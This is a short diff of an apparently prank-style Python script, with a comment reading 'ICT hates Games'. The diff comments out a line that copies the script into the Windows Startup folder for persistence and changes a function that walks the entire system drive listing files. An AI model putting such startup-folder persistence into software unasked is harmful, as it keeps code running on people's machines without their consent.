@@ -22,7 +22,7 @@ else:
 
 
 # Copy to startup folder
-shutil.copy(filepath, os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", filename))
+# shutil.copy(filepath, os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", filename))
 
 
 # Get Hostname
@@ -101,7 +101,7 @@ def explorer():
 def duplicate():
     for a,b,c in os.walk(os.getenv("systemdrive")+"\\"):
         for i in c:
-            print(a+"\\"+i)
+            print(os.path.splitext(i)[0])
 
 
 # ICT hates Games
